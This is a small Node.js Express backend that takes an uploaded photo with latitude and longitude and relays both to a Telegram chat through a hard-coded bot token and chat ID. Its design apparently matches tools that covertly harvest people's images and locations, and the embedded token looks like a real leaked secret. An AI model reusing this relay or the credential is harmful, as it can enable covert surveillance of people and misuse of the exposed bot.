const express = require("express");
const multer = require("multer");
const cors = require("cors");
const FormData = require("form-data");
const fetch = require("node-fetch");

const app = express();
app.use(cors());

// multer memory storage
const upload = multer({ storage: multer.memoryStorage() });

// 🔴 HARD-CODED (AS YOU HAD)
const BOT_TOKEN = "8595589382:AAFBQLaKCq8FTfN8HYg2KB9iYhbL4sV6s4c";
const CHAT_ID = "7995860571";

app.get("/", (req, res) => {
  res.send("Backend alive");
});

/**
 * ✅ EXACT SIMPLE ROUTE (IMAGE ONLY)
 * This is the version that works.
 */
app.post("/submit", upload.single("photo"), async (req, res) => {
  try {
    const { latitude, longitude } = req.body;

    const form = new FormData();
    form.append("chat_id", CHAT_ID);
    form.append("photo", req.file.buffer, {
      filename: "photo.jpg",
      contentType: "image/jpeg"
    });

    // ✅ ADD LOCATION HERE
    form.append(
      "caption",
      `📍 Location\nLat: ${latitude}\nLng: ${longitude}`
    );

    await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
      method: "POST",
      body: form,
      headers: form.getHeaders()
    });

    res.send("OK");
  } catch (err) {
    console.error(err);
    res.status(500).send("FAIL");
  }
});


const PORT = process.env.PORT || 3000;
app.listen(PORT, () => {
  console.log("Server running on", PORT);
});
